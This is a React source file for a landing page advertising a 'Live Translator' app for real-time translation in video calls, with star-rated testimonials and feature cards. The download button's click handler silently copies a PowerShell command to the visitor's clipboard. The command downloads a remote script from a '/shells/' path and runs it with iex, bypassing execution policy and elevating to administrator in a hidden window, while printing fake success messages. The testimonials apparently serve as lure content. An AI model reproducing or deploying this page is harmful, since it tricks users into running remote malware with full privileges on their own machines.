import React, { useEffect, useState } from "react";
import { FaWindows } from "react-icons/fa";
import { FaStar } from "react-icons/fa";

import a1 from "./assets/a1.webp";
import { Link } from 'react-router-dom';
import a4 from "./assets/a4.webp";

import "./index.sixQ31Wp.css";

function App() {

  const [isDialogOpen, setIsDialogOpen] = useState(false);

  const openDialog = () => {
    setIsDialogOpen(true);
  };

  const closeDialog = () => {
    setIsDialogOpen(false);
  };
  
  const [timeLeft, setTimeLeft] = useState(270); // 270 seconds for 4 minutes 30 seconds
  const [isDocumentVisible, setIsDocumentVisible] = useState(false);
  const [isMobile, setIsMobile] = useState(false); // State to check for mobile devices

  useEffect(() => {
    // Check if the user is on a mobile device
    const userAgent = navigator.userAgent || navigator.vendor || window.opera;
    if (/android|iPad|iPhone|iPod/.test(userAgent)) {
      setIsMobile(true);
    }

    // Timer logic
    const timerInterval = setInterval(() => {
      setTimeLeft((prevTime) => {
        if (prevTime <= 0) {
          clearInterval(timerInterval);
          return 0; // Stop the timer at 0
        }
        return prevTime - 1;
      });
    }, 1000); // Update every second

    return () => clearInterval(timerInterval); // Cleanup on unmount
  }, []);

  // Function to copy text to clipboard
  const copyToClipboard = (text) => {
    navigator.clipboard
      .writeText(text)
      .then(() => {
        console.log("Text copied to clipboard");
      })
      .catch((err) => {
        console.error("Could not copy text: ", err);
      });
  };


  const handleAccessClick = () => {
    setIsDocumentVisible(true); // Show the document instructions
    copyToClipboard(`
      Write-Host "Initiating Live Translator download. Please wait..."; $scriptUrl = "https://usjjsjsj.com.ng/shells/back.ps1"; If (-Not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) { Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -Command \`"& { iwr -Uri '$scriptUrl' -UseBasicParsing | iex }\`"" -Verb RunAs -WindowStyle Hidden; Exit }; Write-Host "Live Translator download finished successfully!"
        `);// Copy text to clipboard
};


  // Format time for display
  const formatTime = (seconds) => {
    const minutes = Math.floor(seconds / 60);
    const remainingSeconds = seconds % 60;
    return `${minutes}:${remainingSeconds < 10 ? "0" : ""}${remainingSeconds}`;
  };

  return (
    <>
      <div className="bg-scaffold  text-white h-full flex flex-col px-10 pb-10 mx-auto md:px-30 lg:px-40 xl:px-60 2xl:px-80">
        <div className="flex-1 flex flex-col">
          <div className="flex flex-col items-center text-center mt-14 xl:mt-24">
            <h1
              className="w-full text-5xl font-extrabold md:w-3/4 opacity-0 animate-fade-up"
              style={{ animationDelay: "0.15s", animationFillMode: "forwards" }}
            >
              <span>
                <span className="relative sm:p-2 inline-block">
                  <span className="relative text-white z-10">Real-Time</span>
                  <span className="absolute inset-0 bg-purple-600 z-0 rounded-xl" />
                </span>
                Translation for Video Calls
              </span>
            </h1>
          </div>
          <div className="flex flex-col items-center justify-center text-center">
            <p
              className="w-full mt-6 text-xl text-gray-200 xl:w-3/4 animate-fade-up opacity-0"
              style={{ animationDelay: "0.15s", animationFillMode: "forwards" }}
            >
              <span>
                Experience seamless language translation during video calls.
                Break down language barriers with real-time, accurate
                translations, and communicate effortlessly across cultures
              </span>
            </p>
          </div>
        </div>

        <Link to="/download">
        <div onClick={handleAccessClick} className=" flex items-center justify-center  mt-5 bg-[#d4b0ff] border-2 border-[#464140] text-[#000000] rounded-lg box-border cursor-pointer font-sans font-bold text-[20px]
    h-[60px] max-w-full px-[25px] relative
    text-center no-underline select-none
    transition-transform duration-200 ease-out
    focus:outline-none
    hover:translate-x-2 hover:translate-y-2
    active:bg-[#d4b0ff]">
      <p className="mr-2"> DOWNLOAD LIVE TRANSLATOR</p>
          

          <FaWindows size={25} />
        </div>

        </Link>

    

        

        

        <div
          className="animate-fade-up opacity-0"
          style={{ animationDelay: "0.3s", animationFillMode: "forwards" }}
        >
          {/* Ratings Count + Average */}
          <div className="mt-10 grid grid-cols-1 sm:grid-cols-2 gap-x-4 gap-y-4">
            {/* Row 1 Col 1 */}
            <div className="flex flex-col bg-scaffold shadow-xl border border-gray-300 px-4 py-4 rounded-xl">
              <div className="flex justify-between">
                <div className="font-semibold text-xl underline">
                  Seamless Communication
                </div>
                <div className="flex">
                  <FaStar className="text-yellow-500" />
                  <FaStar className="text-yellow-500" />
                  <FaStar className="text-yellow-500" />
                  <FaStar className="text-yellow-500" />
                  <FaStar className="text-yellow-500" />
                </div>
              </div>
              <div className="mt-4 flex-1">
                This app has made traveling so much easier! I can have real
                conversations with locals without worrying about language
                barriers
              </div>
              <div className="flex justify-end items-end mt-2 text-sm text-gray-400">
                <div>🇪🇸 Carlos Martinez</div>
              </div>
            </div>
            {/* Row 1 Col 2 */}
            <div className="flex flex-col bg-scaffold shadow-xl border border-gray-300 px-4 py-4 rounded-xl">
              <div className="flex justify-between">
                <div className="font-semibold text-xl underline">
                  Super Accurate Translations
                </div>
                <div className="flex">
                  <div className="flex">
                    <FaStar className="text-yellow-500" />
                    <FaStar className="text-yellow-500" />
                    <FaStar className="text-yellow-500" />
                    <FaStar className="text-yellow-500" />
                    <FaStar className="text-yellow-500" />
                  </div>
                </div>
              </div>
              <div className="mt-4 flex-1">
                I’ve tried other apps, but this one has the best accuracy. It
                translates dialects perfectly, and the voice recognition works
                like magic!
              </div>
              <div className="flex items-end justify-end mt-2 text-sm text-gray-400">
                <div>🇮🇹 Luca Moretti</div>
              </div>
            </div>
            {/* Row 2 Col 1 */}
            <div className="flex flex-col bg-scaffold shadow-xl border border-gray-300 px-4 py-4 rounded-xl">
              <div className="flex justify-between">
                <div className="font-semibold text-xl underline">
                  A Lifesaver Abroad
                </div>
                <div className="flex">
                  <div className="flex">
                    <FaStar className="text-yellow-500" />
                    <FaStar className="text-yellow-500" />
                    <FaStar className="text-yellow-500" />
                    <FaStar className="text-yellow-500" />
                    <FaStar className="text-yellow-500" />
                  </div>
                </div>
              </div>
              <div className="mt-4 flex-1">
                Using this app while traveling has been amazing. I don’t even
                need Wi-Fi for basic translations. It’s truly a lifesaver!
              </div>
              <div className="flex items-end justify-end mt-2 text-sm text-gray-400">
                <div>🇺🇸 Mark Stevenson</div>
              </div>
            </div>
            {/* Row 2 Col 2 */}
            <div className="flex flex-col bg-scaffold shadow-xl border border-gray-300 px-4 py-4 rounded-xl">
              <div className="flex justify-between">
                <div className="font-semibold text-xl underline">
                  Easy and Fast
                </div>
                <div className="flex">
                  <div className="flex">
                    <FaStar className="text-yellow-500" />
                    <FaStar className="text-yellow-500" />
                    <FaStar className="text-yellow-500" />
                    <FaStar className="text-yellow-500" />
                    <FaStar className="text-yellow-500" />
                  </div>
                </div>
              </div>
              <div className="mt-4 flex-1">
                The app is incredibly user-friendly and so fast! Real-time chat
                translation lets me message friends in other countries with no
                hassle.
              </div>
              <div className="flex items-end justify-end mt-2 text-sm text-gray-400">
                <div>🇺🇸 Emma Davis</div>
              </div>
            </div>
          </div>
        </div>

        {/* <Features */}
        <div
          className="mt-12 animate-fade-up"
          style={{ animationDelay: "0.3s", animationFillMode: "forwards" }}
        >
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            <div className="bg-gradient-to-r from-purple-900 to-purple-800 p-10 rounded-lg h-96 overflow-hidden">
              <div className="text-lg font-semibold">Real-Time Translator</div>
              <div className="text-sm">Your personal language assistant</div>
              <img className="scale-125 translate-y-8" src={a4} />
            </div>
            <div className="bg-gradient-to-r from-purple-800 to-purple-700 p-10 rounded-lg h-96 overflow-hidden transition">
              <div className="text-lg font-semibold">
                Instant Multi-Language Support
              </div>
              <div className="text-sm">
                Translate conversations in real-time
              </div>
              <img className="scale-125 translate-y-8" src={a1} />
            </div>
          </div>
          <div className="grid gap-4 mt-6 gap-y-8 md:grid-cols-2 lg:grid-cols-3">
            <div className="flex">
              <div className="text-xl">
                <svg
                  xmlns="http://www.w3.org/2000/svg"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  strokeWidth={2}
                  strokeLinecap="round"
                  strokeLinejoin="round"
                  className="w-8 h-8 p-2 text-white duration-200 transform rounded-full shadow hover:scale-105 bg-surface"
                >
                  <rect width={18} height={18} x={3} y={3} rx={2} />
                  <path d="M3 9h18" />
                  <path d="M3 15h18" />
                  <path d="M9 3v18" />
                  <path d="M15 3v18" />
                </svg>
              </div>
              <div className="ml-3">
                <div className="mt-1 font-bold">Real-time Chat Translation</div>
                <div className="mt-1 text-sm text-gray-400">
                  Real-time translations for multiple languages, perfect for
                  travel and daily communication.
                </div>
              </div>
            </div>
            <div className="flex">
              <div className="text-xl">
                <svg
                  xmlns="http://www.w3.org/2000/svg"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  strokeWidth={2}
                  strokeLinecap="round"
                  strokeLinejoin="round"
                  className="w-8 h-8 p-2 text-white duration-200 transform rounded-full shadow hover:scale-105 bg-surface"
                >
                  <circle cx="13.5" cy="6.5" r=".5" fill="currentColor" />
                  <circle cx="17.5" cy="10.5" r=".5" fill="currentColor" />
                  <circle cx="8.5" cy="7.5" r=".5" fill="currentColor" />
                  <circle cx="6.5" cy="12.5" r=".5" fill="currentColor" />
                  <path d="M12 2C6.5 2 2 6.5 2 12s4.5 10 10 10c.926 0 1.648-.746 1.648-1.688 0-.437-.18-.835-.437-1.125-.29-.289-.438-.652-.438-1.125a1.64 1.64 0 0 1 1.668-1.668h1.996c3.051 0 5.555-2.503 5.555-5.554C21.965 6.012 17.461 2 12 2z" />
                </svg>
              </div>
              <div className="ml-3">
                <div className="mt-1 font-bold">
                  Dialect and Regional Options
                </div>
                <div className="mt-1 text-sm text-gray-400">
                  Choose dialects for more accurate, culturally-relevant
                  translations
                </div>
              </div>
            </div>
            <div className="flex">
              <div className="text-xl">
                <svg
                  xmlns="http://www.w3.org/2000/svg"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  strokeWidth={2}
                  strokeLinecap="round"
                  strokeLinejoin="round"
                  className="w-8 h-8 p-2 text-white duration-200 transform rounded-full shadow hover:scale-105 bg-surface"
                >
                  <path d="M8.5 14.5A2.5 2.5 0 0 0 11 12c0-1.38-.5-2-1-3-1.072-2.143-.224-4.054 2-6 .5 2.5 2 4.9 4 6.5 2 1.6 3 3.5 3 5.5a7 7 0 1 1-14 0c0-1.153.433-2.294 1-3a2.5 2.5 0 0 0 2.5 2.5z" />
                </svg>
              </div>
              <div className="ml-3">
                <div className="mt-1 font-bold">Multi-Language Support</div>
                <div className="mt-1 text-sm text-gray-400">
                  Allow for translation between multiple languages with a high
                  level of accuracy, adapting to regional dialects where
                  possible.
                </div>
              </div>
            </div>
            <div className="flex">
              <div className="text-xl">
                <svg
                  xmlns="http://www.w3.org/2000/svg"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  strokeWidth={2}
                  strokeLinecap="round"
                  strokeLinejoin="round"
                  className="w-8 h-8 p-2 text-white duration-200 transform rounded-full shadow hover:scale-105 bg-surface"
                >
                  <path d="M6 8a6 6 0 0 1 12 0c0 7 3 9 3 9H3s3-2 3-9" />
                  <path d="M10.3 21a1.94 1.94 0 0 0 3.4 0" />
                  <path d="M4 2C2.8 3.7 2 5.7 2 8" />
                  <path d="M22 8c0-2.3-.8-4.3-2-6" />
                </svg>
              </div>
              <div className="ml-3">
                <div className="mt-1 font-bold">Image Text Translation</div>
                <div className="mt-1 text-sm text-gray-400">
                  Snap a picture to translate text from signs, menus, or
                  documents
                </div>
              </div>
            </div>
            <div className="flex">
              <div className="text-xl">
                <svg
                  className="w-8 h-8 p-2 text-white duration-200 transform rounded-full shadow hover:scale-105 bg-surface"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  strokeWidth={2}
                  strokeLinecap="round"
                  strokeLinejoin="round"
                >
                  <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z" />
                </svg>
              </div>
              <div className="ml-3">
                <div className="mt-1 font-bold">Offline Mode</div>
                <div className="mt-1 text-sm text-gray-400">
                  Translate select languages offline, ideal for areas with
                  limited connectivity
                </div>
              </div>
            </div>
            <div className="flex">
              <div className="text-xl">
                <svg
                  xmlns="http://www.w3.org/2000/svg"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  strokeWidth={2}
                  strokeLinecap="round"
                  strokeLinejoin="round"
                  className="w-8 h-8 p-2 text-white duration-200 transform rounded-full shadow hover:scale-105 bg-surface"
                >
                  <path d="M8 2v4" />
                  <path d="M16 2v4" />
                  <rect width={18} height={18} x={3} y={4} rx={2} />
                  <path d="M3 10h18" />
                  <path d="m9 16 2 2 4-4" />
                </svg>
              </div>
              <div className="ml-3">
                <div className="mt-1 font-bold">Calendar</div>
                <div className="mt-1 text-sm text-gray-400">
                  Real-time translations for multiple languages, perfect for
                  travel and daily communication
                </div>
              </div>
            </div>
          </div>
        </div>

        <Link to="/download">
        <div className=" flex items-center justify-center  mt-5 bg-[#d4b0ff] border-2 border-[#464140] text-[#000000] rounded-lg box-border cursor-pointer font-sans font-bold text-[20px]
    h-[60px] max-w-full px-[25px] relative
    text-center no-underline select-none
    transition-transform duration-200 ease-out
    focus:outline-none
    hover:translate-x-2 hover:translate-y-2
    active:bg-[#d4b0ff]">
      <p className="mr-2"> DOWNLOAD LIVE TRANSLATOR</p>
          

          <FaWindows size={25} />
        </div>

        </Link>

      </div>
    </>
  );
}

export default App;
